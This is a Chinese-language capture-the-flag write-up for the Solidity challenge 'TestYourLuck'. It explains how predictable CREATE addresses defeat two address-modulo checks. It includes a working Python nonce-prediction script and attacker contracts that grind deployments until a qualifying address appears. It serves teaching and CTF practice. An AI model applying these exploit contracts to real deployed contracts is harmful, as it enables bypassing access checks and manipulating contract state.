# TestYourLuck

## 题目简述

目标合约同时限制调用者地址和新建合约地址：调用 `checkyourluck()` 的 `msg.sender` 必须满足地址整数模 50 等于 20；函数内部创建的 `Void` 地址模 50 还必须等于 30，否则目标合约会自毁。核心是利用 EVM 的 CREATE 地址可预测性控制这两个条件。

## 解题过程

目标逻辑可以归纳为：

```solidity
modifier OnlyYou {
    require(uint256(uint160(msg.sender)) % 50 == 20);
    _;
}

function makevoid() external {
    new Void();
}

function checkyourluck() external OnlyYou {
    Void v = new Void();
    if (uint256(uint160(address(v))) % 50 == 30) {
        solved = true;
    } else {
        selfdestruct(owner);
    }
}
```

### 预测 `Void` 地址

普通 CREATE 生成的合约地址为：

```text
keccak256(RLP([creator_address, creator_nonce])) 的低 20 字节
```

这里 `creator` 是 `TestLuck`，而 `makevoid()` 每调用一次都会创建一个 `Void` 并推进其 CREATE nonce。计算时必须输入当前实例的真实 20 字节合约地址：

```python
import sys

from Crypto.Hash import keccak


def rlp_integer(value: int) -> bytes:
    if value == 0:
        return b"\x80"
    raw = value.to_bytes((value.bit_length() + 7) // 8, "big")
    if len(raw) == 1 and raw[0] < 0x80:
        return raw
    return bytes([0x80 + len(raw)]) + raw


def create_address(creator: bytes, nonce: int) -> int:
    payload = b"\x94" + creator + rlp_integer(nonce)
    encoded = bytes([0xC0 + len(payload)]) + payload
    digest = keccak.new(digest_bits=256, data=encoded).digest()
    return int.from_bytes(digest[-20:], "big")


target_hex = sys.argv[1].removeprefix("0x")
target = bytes.fromhex(target_hex)
if len(target) != 20:
    raise ValueError("目标合约地址必须恰好为 20 字节")

# 新部署的 TestLuck 通常从 CREATE nonce 1 开始；若实例已创建过 Void，
# 应改成 eth_getTransactionCount(target, "latest") 返回的当前 nonce。
current_nonce = int(sys.argv[2]) if len(sys.argv) > 2 else 1

for nonce in range(current_nonce, current_nonce + 10000):
    if create_address(target, nonce) % 50 == 30:
        print("checkyourluck 使用 nonce:", nonce)
        print("此前需要调用 makevoid 次数:", nonce - current_nonce)
        break
```

例如把脚本保存为 `find_nonce.py` 后，使用 `python3 find_nonce.py <TARGET_ADDRESS>` 计算新实例；若目标已经调用过 `makevoid()`，还要把链上查询到的当前 nonce 作为第二个参数。仓库中的 `exp.py` 把 21 字节数据误当成地址，而两份旧解法又分别固定循环 33 和 51 次，彼此矛盾；这些数值都不能脱离实际实例直接照搬。

### 构造合格调用者

再部署一个工厂合约，连续 CREATE `Exploit`。平均约 50 次就会出现地址模 50 等于 20 的实例；只有这个实例的构造函数调用目标，因此此前失败的部署不会推进 `TestLuck` 的 nonce。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITestLuck {
    function makevoid() external;
    function checkyourluck() external;
    function isSolved() external returns (bool);
}

contract Hack {
    Exploit public exploit;

    function attack(address target, uint256 advance) external {
        while (true) {
            exploit = new Exploit(target, advance);
            if (uint256(uint160(address(exploit))) % 50 == 20) {
                break;
            }
        }
    }
}

contract Exploit {
    constructor(address target, uint256 advance) {
        if (uint256(uint160(address(this))) % 50 == 20) {
            ITestLuck challenge = ITestLuck(target);
            for (uint256 i = 0; i < advance; ++i) {
                challenge.makevoid();
            }
            challenge.checkyourluck();
            require(challenge.isSolved(), "not solved");
        }
    }
}
```

把计算器输出的“此前需要调用 `makevoid` 次数”作为 `advance` 调用 `attack(target, advance)`。命中两个地址条件后，`solved` 被置为 `true`，平台即可判定通过。

## 方法总结

本题的两个“运气”条件都是确定性的 CREATE 地址约束。外层用工厂不断部署以筛选合格的 `msg.sender`，内层根据 `TestLuck` 地址和 nonce 预计算 `Void` 地址，再用空创建推进 nonce。计算时必须使用 Keccak-256 与正确的 RLP 编码，并区分“目标合约当前 nonce”和“需要预推进的调用次数”。
